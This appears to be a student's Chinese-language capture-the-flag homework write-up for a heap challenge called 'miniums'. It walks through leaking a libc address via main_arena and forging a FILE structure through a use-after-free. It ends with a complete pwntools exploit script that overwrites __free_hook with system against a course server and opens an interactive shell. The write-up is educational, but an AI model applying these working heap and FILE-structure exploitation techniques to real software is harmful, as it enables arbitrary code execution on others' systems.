# hw_miniums

1. 這題我的想法是先想辦法偽造出 FILE，然後將偽造出來的 FILE 想辦法放進 heap 裡面，來執行任意讀或是任意寫。
2. 所以我先嘗試 leak 出 libc 的 address ，但嘗試了很久只能 leak 出 tcache 的 address，但我想要 leak 出 unsorted bin 那一塊的 fd 因為他會指向 main_arena 。

```python
add_user(0, "aaaaaa")
edit_user(0, 8, "bbbbbb")
add_user(1, "cccccc")
del_user(1)
del_user(0)

show_users()
r.recvuntil(b"[0] ")
print("address :", hex(u64(r.recv(6).ljust(8,b"\x00"))))
```

![截圖 2022-12-15 上午12.47.18.png](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/%25E6%2588%25AA%25E5%259C%2596_2022-12-15_%25E4%25B8%258A%25E5%258D%258812.47.18.png)

![截圖 2022-12-16 上午1.50.53.png](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/%25E6%2588%25AA%25E5%259C%2596_2022-12-16_%25E4%25B8%258A%25E5%258D%25881.50.53.png)

1. 於是我思考了一下，改變了我 heap 堆疊的順序，先找一塊被 free 的 chunk 裡面有 fd 跟 bk，然後重新add user 或 edit user 的時候可以蓋過那個 chunk fd 跟 bk 沒有被洗掉，就會存在裡面，只是蓋過去蓋一個字元就好，不然就會把 fd 跟 bk 蓋過去，類似像下圖這樣，fd 的話因為被我蓋掉後三位，所以 fd 後三位是錯的，bk 就是 指向 main arena。

![Untitled](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/Untitled.png)

1. 我這邊可以選擇想辦法去印出 fd 或是 bk ，我選擇印出 fd ，但遇到一個問題 fd 後三位被我蓋掉，但那邊因為是 RVA 會是固定的 offset ，所以我那邊直接將那個固定的值填上被我蓋掉的地方，一樣可以找到 main_arena + 96 ，有了 main_arena + 96 的位址後，就可以去計算他跟 system、free_hook、_IO_file_jumps 之間的距離，而得到他們的位址，以便做後續的利用。

![截圖 2022-12-16 上午2.09.16.png](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/%25E6%2588%25AA%25E5%259C%2596_2022-12-16_%25E4%25B8%258A%25E5%258D%25882.09.16.png)

```python

add_user(0, "aaaaaaaaaa")
edit_user(0, 16, "bbbbbb")
add_user(1, "cccccc")
del_user(0)

add_user(2, "a")
add_user(3, "a")
edit_user(3, 8, "b")
show_users()

r.recvuntil(b"[3] a\n")
b = "be0"
r.recvuntil(b"data: ")
main_arena = int(str(hex(u64(r.recv(6)+b"\00\00"))[0:11]+b),16)
free_hook = main_arena + 0x2268
system = main_arena - 0x19a950
_IO_file_jumps = main_arena -  0x3740

print("main_arena_96", hex(main_arena))
print("free_hook", hex(free_hook))
print("system", hex(system))
print("_IO_file_jumps", hex(_IO_file_jumps))

```

1. 接下來要想辦法構造一個 fake 的 FILE 去執行 AAW 控制 fread 的流程，因為這邊沒有 overflow 所以要用別的方法把這個 fake 的 FILE 放進 heap ，所以我想辦法用 UAF ，而我有辦法做到 UAF ，但不知道為什麼我寫入的 FILE 都會有問題

如果我放入的 payload 是 edit_user(4, "464","A"*100)，會變成下面這張圖這樣

![截圖 2022-12-16 上午4.56.36.png](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/%25E6%2588%25AA%25E5%259C%2596_2022-12-16_%25E4%25B8%258A%25E5%258D%25884.56.36.png)

但如過我放入的 payload 是 edit_user(4, "464",flat(0xfbad0000))，他會直接變成下面這樣，而不是想要的那種 file結構，而這邊的這個問題我還沒解決，目前只有解到這邊。

![截圖 2022-12-16 上午4.52.36.png](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/%25E6%2588%25AA%25E5%259C%2596_2022-12-16_%25E4%25B8%258A%25E5%258D%25884.52.36.png)

後來我這邊解決了，但由於在壓線前十五分鐘內寫完，所以來不急寫這邊的 writeup，下面直接附上解題腳本，後需有時間會補交 writeup。

```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#r = process("./chal")
r = remote("edu-ctf.zoolab.org","10011")
def add_user( index , username):
    r.sendlineafter( b">", b"1" )
    r.sendlineafter( b"index\n>", str(index).encode() )
    r.sendlineafter( b"username\n>", str(username).encode())

def edit_user( index, size, data):
    r.sendlineafter( b">", b"2" )
    r.sendlineafter( b"index\n>", str(index).encode() )
    r.sendlineafter( b"size\n>", str(size).encode() )
    r.send(data)

def del_user( index ):
    r.sendlineafter( b">", b"3" )
    r.sendlineafter( b"index\n>", str(index).encode() )

def show_users():
    r.sendlineafter( b">", b"4" )

add_user(0, "aaaaaaaaaa")
edit_user(0, 16, "bbbbbb")
add_user(1, "aaaaaaaaaa")
del_user(0)

add_user(2, "a")
add_user(3, "a")
edit_user(3, 8, "b")
show_users()

r.recvuntil(b"[3] a\n")
#a = hex(u64(r.recv(6)+b"\00\00"))
b = "be0"
#print("address:", a)

r.recvuntil(b"data: ")
main_arena = int(str(hex(u64(r.recv(6)+b"\00\00"))[0:11]+b),16)

free_hook = main_arena + 0x2268
system = main_arena - 0x19a950
print("main_arena", hex(main_arena))
print("free_hook", hex(free_hook))
print("system", hex(system))

size = 0x30
payload1 = flat(
    0xfbad0000, 0,
    0, 0,
    0, 0,
    0, free_hook,
    free_hook + size, 0,
    0, 0,
    0, 0x7ffff7fbc5c0,
    0x0
)

edit_user(2, 8, "A"*8)
del_user(3)
del_user(2)

edit_user(1, 0x1e0-0x10, payload1)

print("--------fread---------")

show_users()
payload = p64((system), endian='big')
for i in range(0x200//0x8):
    print(payload[::-1])
    r.send(payload[::-1])

#gdb.attach(r)
r.interactive()
```

![Untitled](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/Untitled%201.png)

![截圖 2022-12-16 上午8.53.54.png](hw_miniums%20a2d4da3b8ff94ea3a4f99c7a5ef55862/%25E6%2588%25AA%25E5%259C%2596_2022-12-16_%25E4%25B8%258A%25E5%258D%25888.53.54.png)